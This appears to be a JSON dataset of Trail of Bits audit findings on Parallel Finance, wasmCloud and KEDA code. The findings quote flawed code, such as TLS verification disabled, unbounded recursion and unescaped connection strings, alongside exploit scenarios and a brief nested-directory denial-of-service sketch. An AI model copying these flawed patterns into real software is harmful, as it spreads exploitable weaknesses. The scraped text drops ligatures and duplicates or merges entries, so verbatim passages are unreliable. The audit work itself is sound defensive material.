        "body": "When the liquid-staking pallet generates an XCM request for the parent chain, the corresponding XCM response triggers a call to Pallet::notification_received . If the response is of the Response::ExecutionResult type, this method calls Pallet::do_notification_received to handle the result. The Pallet::do_notification_received method checks whether the request was successful and then updates the local state according to the corresponding XCM request, which is obtained from the XcmRequests storage map. fn do_notification_received ( query_id: QueryId , request: XcmRequest <T>, res: Option <( u32 , XcmError)>, ) -> DispatchResult { use ArithmeticKind::*; use XcmRequest::*; let executed = res.is_none(); if !executed { return Ok (()); } match request { Bond { index: derivative_index , amount, } => { ensure!( !StakingLedgers::<T>::contains_key(&derivative_index), Error::<T>::AlreadyBonded ); let staking_ledger = <StakingLedger<T::AccountId, BalanceOf<T>>>::new( Self ::derivative_sovereign_account_id(derivative_index), amount, ); StakingLedgers::<T>::insert(derivative_index, staking_ledger); MatchingPool::<T>::try_mutate(|p| -> DispatchResult { p.update_total_stake_amount(amount, Subtraction) })?; T::Assets::burn_from( Self ::staking_currency()?, & Self ::account_id(), Amount )?; } // ... <redacted> } XcmRequests::<T>::remove(&query_id); Ok (()) } Figure 5.1: pallets/liquid-staking/src/lib.rs:1071-1159 If the method completes without errors, the XCM request is removed from storage via a call to XcmRequests<T>::remove(query_id) . However, if any of the following conditions are true, the corresponding XCM request is left in storage indenitely: 1. The request fails and Pallet::do_notification_received exits early. 2. Pallet::do_notification_received fails. 3. The response type is not Response::ExecutionResult . These three cases are currently unhandled by the codebase. The same issue is present in the crowdloans pallet implementation of Pallet::do_notification_received . Recommendations Short term, ensure that failed XCM requests are handled correctly by the crowdloans and liquid-staking pallets.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Risk of using stale oracle prices in loans pallet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The loans pallet uses oracle prices to nd a USD value of assets using the get_price function (gure 6.1). The get_price function internally uses the T::PriceFeeder::get_price function, which returns a timestamp and the price. However, the returned timestamp is ignored. pub fn get_price (asset_id: AssetIdOf <T>) -> Result <Price, DispatchError> { let (price, _) = T::PriceFeeder::get_price(&asset_id) .ok_or(Error::<T>::PriceOracleNotReady)?; if price.is_zero() { return Err (Error::<T>::PriceIsZero.into()); } log::trace!( target: \"loans::get_price\" , \"price: {:?}\" , price.into_inner() ); Ok (price) } Figure 6.1: pallets/loans/src/lib.rs: 1430-1441 Exploit Scenario The price feeding oracles fail to deliver prices for an extended period of time. The get_price function returns stale prices, causing the get_asset_value function to return a non-market asset value. Recommendations Short term, modify the code so that it compares the returned timestamp from the T::PriceFeeder::get_price function with the current timestamp, returns an error if the price is too old, and handles the emergency price, which currently has a timestamp of zero. This will stop the market if stale prices are returned and allow the governance process to intervene with an emergency price.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Missing calculations in crowdloans extrinsics ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The claim extrinsic in the crowdloans pallet is missing code to subtract the claimed amount from vault.contributed to update the total contribution amount (gure 7.1). A similar bug exists in the refund extrinsic: there is no subtraction from vault.contributed after the Self::contribution_kill call. pub fn claim ( origin: OriginFor <T>, crowdloan: ParaId , lease_start: LeasePeriod , lease_end: LeasePeriod , ) -> DispatchResult { // ... <redacted> Self ::contribution_kill( vault.trie_index, &who, ChildStorageKind::Contributed ); Self ::deposit_event(Event::<T>::VaultClaimed( crowdloan, (lease_start, lease_end), ctoken, who, amount, VaultPhase::Succeeded, )); Ok (()) } Figure 7.1: pallets/crowdloans/src/lib.rs: 718- Exploit Scenario The claim extrinsic is called, but the total amount in vault.contributed is not updated, leading to incorrect calculations in other places. Recommendations Short term, update the claim and refund extrinsics so that they subtract the amount from vault.contributed . Long term, add a test suite to ensure that the vault state stays consistent after the claim and refund extrinsics are called.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Event emitted when update_vault and set_vrf calls do not make updates ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The update_vault extrinsic in the crowdloans pallet is responsible for updating the three values shown in gure 8.1. It is possible to call update_vault in such a way that no update is performed, but the function emits an event regardless of whether an update occurred. The same situation occurs in the set_vrfs extrinsic (gure 8.2). pub fn update_vault ( origin: OriginFor <T>, crowdloan: ParaId , cap: Option <BalanceOf<T>>, end_block: Option <BlockNumberFor<T>>, contribution_strategy: Option <ContributionStrategy>, ) -> DispatchResult { T::UpdateVaultOrigin::ensure_origin(origin)?; let mut vault = Self ::current_vault(crowdloan) .ok_or(Error::<T>::VaultDoesNotExist)?; if let Some (cap) = cap { // ... <redacted> } if let Some (end_block) = end_block { // ... <redacted> } if let Some (contribution_strategy) = contribution_strategy { // ... <redacted> } // ... <redacted> Self ::deposit_event(Event::<T>::VaultUpdated( crowdloan, (lease_start, lease_end), contribution_strategy, cap, end_block, )); Ok (()) } Figure 8.1: pallets/crowdloans/src/lib.rs:424-472 pub fn set_vrfs (origin: OriginFor <T>, vrfs: Vec <ParaId>) -> DispatchResult { T::VrfOrigin::ensure_origin(origin)?; log::trace!( target: \"crowdloans::set_vrfs\" , \"pre-toggle. vrfs: {:?}\" , vrfs ); Vrfs::<T>::try_mutate(|b| -> Result <(), DispatchError> { *b = vrfs.try_into().map_err(|_| Error::<T>::MaxVrfsExceeded)?; Ok (()) })?; Self ::deposit_event(Event::<T>::VrfsUpdated( Self ::vrfs())); Ok (()) } Figure 8.2: pallets/crowdloans/src/lib.rs:599-616 Exploit Scenario A system observes that the VaultUpdate event was emitted even though the vault state did not actually change. Based on this observation, it performs logic that should be executed only when the state has been updated. Recommendations Short term, modify the VaultUpdate event so that it is emitted only when the update_vault extrinsic makes an actual update. Optionally, have the update_vault extrinsic return an error to the caller when calling it results in no updates.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. The referral code is a sequence of arbitrary bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The referral code is used in a number of extrinsic calls in the crowdloans pallet. Because the referral code is never validated, it can be a sequence of arbitrary bytes. The referral code is logged by a number of extrinsics. However, it is currently impossible to perform log injection because the referral code is printed as a hexidecimal string rather than raw bytes (using the debug representation). pub fn contribute ( origin: OriginFor <T>, crowdloan: ParaId , #[pallet::compact] amount: BalanceOf <T>, referral_code: Vec < u8 > , ) -> DispatchResultWithPostInfo { // ... <redacted> log::trace!( target: \"crowdloans::contribute\" , \"who: {:?}, para_id: {:?}, amount: {:?}, referral_code: {:?}\" , &who, &crowdloan, &amount, &referral_code ); Ok (().into()) } Figure 9.1: pallets/crowdloans/src/lib.rs: 502-594 Exploit Scenario The referral code is rendered as raw bytes in a vulnerable environment, introducing an opportunity to perform a log injection attack. Recommendations Short term, choose and implement a data type that models the referral code semantics as closely as possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Missing validation of referral code size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The length of the referral code is not validated by the contribute extrinsic dened by the crowdloans pallet. Since the referral code is stored by the node, a malicious user could call contribute multiple times with a very large referral code. This would increase the memory pressure on the node, potentially leading to memory exhaustion. fn do_contribute ( who: & AccountIdOf <T>, crowdloan: ParaId , vault_id: VaultId , amount: BalanceOf <T>, referral_code: Vec < u8 >, ) -> Result <(), DispatchError> { // ... <redacted> XcmRequests::<T>::insert( query_id, XcmRequest::Contribute { crowdloan, vault_id, who: who .clone(), amount, referral_code: referral_code .clone() , }, ); // ... <redacted> Ok (()) } Figure 10.1: pallets/crowdloans/src/lib.rs: 1429- Exploit Scenario A malicious user calls the contribute extrinsic multiple times with a very large referral code. This increases the memory pressure on the validator nodes and eventually causes all parachain nodes to run out of memory and crash. Recommendations Short term, add validation that limits the size of the referral code argument to the contribute extrinsic.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Code duplication in crowdloans pallet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "A number of extrinsics in the crowdloans pallet have duplicate code. The close , reopen , and auction_succeeded extrinsics have virtually identical logic. The migrate_pending and refund extrinsics are also fairly similar. Exploit Scenario A vulnerability is found in the duplicate code, but it is patched in only one place. Recommendations Short term, refactor the close , reopen , and auction_succeeded extrinsics into one function, to be called with values specic to the extrinsics. Refactor common pieces of logic in the migrate_pending and refund extrinsics. Long term, avoid code duplication, as it makes the system harder to review and update. Perform regular code reviews and track any logic that is duplicated.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Out-of-bounds crash in extract_claims ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf",
        "body": "The strip_custom_section function does not suciently validate data and crashes when the range is not within the buer (gure 1.1). The function is used in the extract_claims function and is given an untrusted input. In the wasmCloud-otp , even though extract_claims is called as an Erlang NIF (Native Implemented Function) and potentially could bring down the VM upon crashing, the panic is handled gracefully by the Rustler library, resulting in an isolated crash of the Elixir process. if let Some ((id, range )) = payload.as_section() { wasm_encoder::RawSection { id, data: & buf [range] , } .append_to(& mut output); } Figure 1.1: wascap/src/wasm.rs#L161-L167 We found this issue by fuzzing the extract_claims function with cargo-fuzz (gure 2.1). #![no_main] use libfuzzer_sys::fuzz_target; use getrandom::register_custom_getrandom; // TODO: the program wont compile without this, why? fn custom_getrandom (buf: & mut [ u8 ]) -> Result <(), getrandom::Error> { return Ok (()); } register_custom_getrandom!(custom_getrandom); fuzz_target!(|data: & [ u8 ]| { let _ = wascap::wasm::extract_claims(data); }); Figure 1.2: A simple extract_claims fuzzing harness that passes the fuzzer-provided bytes straight to the function After xing the issue (gure 1.3), we fuzzed the function for an extended period of time; however, we found no additional issues. if let Some ((id, range)) = payload.as_section() { if range.end <= buf.len() { wasm_encoder::RawSection { id, data: & buf [range], } .append_to(& mut output); } else { return Err (errors::new(ErrorKind::InvalidCapability)); } } Figure 1.3: The x we applied to continue fuzzing extract_claims . The code requires a new error value because we reused one of the existing ones that likely does not match the semantics. Exploit Scenario An attacker deploys a new module with invalid claims. While decoding the claims, the extract_claims function panics and crashes the Elixir process. Recommendations Short term, x the strip_custom_section function by adding the range check, as shown in the gure 1.3. Add the extract_claims fuzzing harness to the wascap repository and run it for an extended period of time before each release of the library. Long term, add a fuzzing harness for each Rust function that processes user-provided data. References  Erlang - NIFs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Stack overow while enumerating containers in blobstore-fs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf",
        "body": "The all_dirs function is vulnerable to a stack overow caused by unbounded recursion, triggered by either the presence of circular symlinks inside the root of the blobstore (as congured during startup), or the presence of excessively nested directory inside the same. Because this function is used by FsProvider::list_containers , this issue would result in a denial of service for all actors that use the method exposed by aected blobstores. let mut subdirs: Vec <PathBuf> = Vec ::new(); for dir in &dirs { let mut local_subdirs = all_dirs(prefix.join(dir.as_path()).as_path(), prefix); subdirs.append( &mut local_subdirs); } dirs.append( &mut subdirs); dirs Figure 2.1: capability-providers/blobstore-fs/src/fs_utils.rs#L24-L30 Exploit Scenario An attacker creates a circular symlink inside the storage directory. Alternatively, an attacker canunder the right circumstancescreate successively nested directories with a sucient depth to cause a stack overow. blobstore.create_container(ctx, &\"a\".to_string()). await ?; blobstore.create_container(ctx, &\"a/a\".to_string()). await ?; blobstore.create_container(ctx, &\"a/a/a\".to_string()). await ?; ... blobstore.create_container(ctx, &\"a/a/a/.../a/a/a\".to_string()). await ?; blobstore.list_containers(). await ?; Figure 2.2: Possible attack to a vulnerable blobstore In practice, this attack requires the underlying le system to allow exceptionally long lenames, and we have not been able to produce a working attack payload. However, this does not prove that no such le systems exist or will exist in the future. Recommendations Short term, limit the amount of allowable recursion depth to ensure that no stack overow attack is possible given realistic stack sizes, as shown in gure 2.3. pub fn all_dirs(root: &Path, prefix: &Path, depth: i32 ) -> Vec <PathBuf> { if depth > 1000 { return vec![]; } ... // Now recursively go in all directories and collect all sub-directories let mut subdirs: Vec <PathBuf> = Vec ::new(); for dir in &dirs { let mut local_subdirs = all_dirs( prefix.join(dir.as_path()).as_path(), prefix, depth + 1 ); subdirs.append( &mut local_subdirs); } dirs.append( &mut subdirs); dirs } Figure 2.3: Limiting the amount of allowable recursion depth Long term, consider limiting the reliance on the underlying le system to a minimum by disallowing nesting containers. For example, Base64-encode all container and object names before passing them down to the le system routines. References  OWASP Denial of Service Cheat Sheet (\"Input validation\" section)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Denial of service in blobstore-s3 using malicious actor ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf",
        "body": "The stream_bytes function continues looping until it detects that all of the available bytes have been sent. It does this based on the output of the send_chunk function, which reports the amount of bytes that have been sent by the call. An attacker could send specially crafted responses that cause stream_bytes to continue looping, causing send_chunk to report that no errors were detected while also reporting that no bytes were sent. while bytes_sent < bytes_to_send { let chunk_offset = offset + bytes_sent; let chunk_len = (self.max_chunk_size() as u64).min(bytes_to_send - bytes_sent); bytes_sent += self .send_chunk ( ctx, Chunk { is_last: offset + chunk_len > end_range, bytes: bytes[bytes_sent as usize..(bytes_sent + chunk_len) as usize] .to_vec(), offset: chunk_offset as u64, container_id: bucket_id.to_string(), object_id: cobj.object_id.clone(), }, ) .await?; } Figure 3.1: capability-providers/blobstore-s3/src/lib.rs#L188-L204 Exploit Scenario An attacker can send a maliciously crafted request to get an object from a blobstore-s3 provider, then send successful responses without making actual progress in the transfer by reporting that empty-sized chunks were received. Recommendations Make send_chunk report a failure if a zero-sized response is received.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Unexpected panic in validate_token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf",
        "body": "The validate_token function from the wascap library panics with an out-of-bounds error when input is given in an unexpected format. The function expects the input to be a valid JWT token with three segments separated by a dot (gure 4.1). This implicit assumption is satised in the code; however, the function is public and does not mention the assumption in its documentation. /// Validates a signed JWT. This will check the signature, expiration time, and not-valid-before time pub fn validate_token <T>(input: &str ) -> Result <TokenValidation> where T: Serialize + DeserializeOwned + WascapEntity, { } let segments: Vec <& str > = input.split( '.' ).collect(); let header_and_claims = format! ( \"{}.{}\" , segments[ 0 ] , segments[ 1 ] ); let sig = base64::decode_config( segments[ 2 ] , base64::URL_SAFE_NO_PAD)?; ... Figure 4.1: wascap/src/jwt.rs#L612-L641 Exploit Scenario A developer uses the validate_token function expecting it to fully validate the token string. The function receives an untrusted malicious input that forces the program to panic. Recommendations Short term, add input format validation before accessing the segments and a test case with malformed input. Long term, always validate all inputs to functions or document the input assumptions if validation is not in place for a specic reason.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Incorrect error message when starting actor from le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf",
        "body": "The error message when starting an actor from a le contains a string interpolation bug that causes the message to not include the fileref content (gure 5.1). This causes the error message to contain the literal string ${fileref} instead. It is worth noting that the leref content will be included anyway as an attribute. Logger .error( \"Failed to read actor file from ${fileref} : #{ inspect(err) } \" , fileref : fileref ) Figure 5.1: host_core/lib/host_core/actors/actor_supervisor.ex#L301 Recommendations Short term, change the error message to correctly interpolate the fileref string. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Use of fmt.Sprintf to build host:port string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue. 2. MongoDB scaler does not encode username and password in connection string Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-KEDA-2 Target: pkg/scalers/mongo_scaler.go",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Prometheus metrics server does not support TLS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port 9022. When Prometheus makes a connection to the server, it is unencrypted, leaving both the request and response vulnerable to interception and tampering in transit. As KEDA does not support TLS for the server, the user has no way to ensure the condentiality and integrity of these metrics. Recommendations Short term, provide a ag to enable TLS for Prometheus metrics exposed by the Metrics Adapter. The usual way to enable TLS for an HTTP server is using the http.ListenAndServeTLS function.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Return value is dereferenced before error check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "After certain calls to http.NewRequestWithContext , the *Request return value is dereferenced before the error return value is checked (see the highlighted lines in gures 4.1 and 4.2). checkTokenRequest, err := http.NewRequestWithContext(ctx, \"HEAD\" , tokenURL.String(), nil ) checkTokenRequest.Header.Set( \"X-Subject-Token\" , token) checkTokenRequest.Header.Set( \"X-Auth-Token\" , token) if err != nil { return false , err } Figure 4.1: pkg/scalers/openstack/keystone_authentication.go#L118-L124 req, err := http.NewRequestWithContext(ctx, \"GET\" , url, nil ) req.SetBasicAuth(s.metadata.username, s.metadata.password) req.Header.Set( \"Origin\" , s.metadata.corsHeader) if err != nil { return - 1 , err } Figure 4.2: pkg/scalers/artemis_scaler.go#L241-L248 If an error occurred in the call to NewRequestWithContext , this behavior could result in a panic due to a nil pointer dereference. Exploit Scenario One of the calls to http.NewRequestWithContext shown in gures 4.1 and 4.2 returns an error and a nil *Request pointer. The subsequent code dereferences the nil pointer, resulting in a panic, crash, and DoS condition for the aected KEDA scaler. Recommendations Short term, check the error return value before accessing the returned *Request (e.g., by calling methods on it). Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Unescaped components in PostgreSQL connection string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The PostgreSQL scaler creates a connection string by formatting the congured host, port, username, database name, SSL mode, and password with fmt.Sprintf : meta.connection = fmt.Sprintf( \"host=%s port=%s user=%s dbname=%s sslmode=%s password=%s\" , host, port, userName, dbName, sslmode, password, ) Figure 5.1: pkg/scalers/postgresql_scaler.go#L127-L135 However, none of the parameters included in the format string are escaped before the call to fmt.Sprintf . According to the PostgreSQL documentation ,  To write an empty value, or a value containing spaces, surround it with single quotes, for example keyword = 'a value' . Single quotes and backslashes within a value must be escaped with a backslash, i.e., \\' and \\\\ . As KEDA does not perform this escaping, the connection string could fail to parse if any of the conguration parameters (e.g., the password) contains symbols with special meaning in PostgreSQL connection strings. Furthermore, this issue may allow the injection of harmful or unintended parameters into the connection string using spaces and equal signs. Although the latter attack violates assumptions about the applications behavior, it is not a severe issue in KEDAs case because users can already pass full connection strings via the connectionFromEnv conguration parameter. Exploit Scenario A user congures the PostgreSQL scaler with a password containing a space. As the PostgreSQL scaler does not escape the password in the connection string, when the client connection is initialized, the string fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, escape the user-provided PostgreSQL parameters using the method described in the PostgreSQL documentation . Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter. 7. Insu\u0000cient check against nil Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-KEDA-7 Target: pkg/scalers/azure_eventhub_scaler.go#L253-L259",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Use of fmt.Sprintf to build host:port string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. MongoDB scaler does not encode username and password in connection string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The MongoDB scaler creates a connection string URI by concatenating the congured host, port, username, and password: addr := fmt.Sprintf( \"%s:%s\" , meta.host, meta.port) auth := fmt.Sprintf( \"%s:%s\" , meta.username, meta.password) connStr = \"mongodb://\" + auth + \"@\" + addr + \"/\" + meta.dbName Figure 2.1: pkg/scalers/mongo_scaler.go#L191-L193 Per MongoDB documentation, if either the username or password contains a character in the set :/?#[]@ , it must be percent-encoded . However, KEDA does not do this. As a result, the constructed connection string could fail to parse. Exploit Scenario A user congures the MongoDB scaler with a password containing an  @  character, and the MongoDB scaler does not encode the password in the connection string. As a result, when the client object is initialized, the URL fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, percent-encode the user-supplied username and password before constructing the connection string. Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Prometheus metrics server does not support TLS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Insu\u0000cient check against nil ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
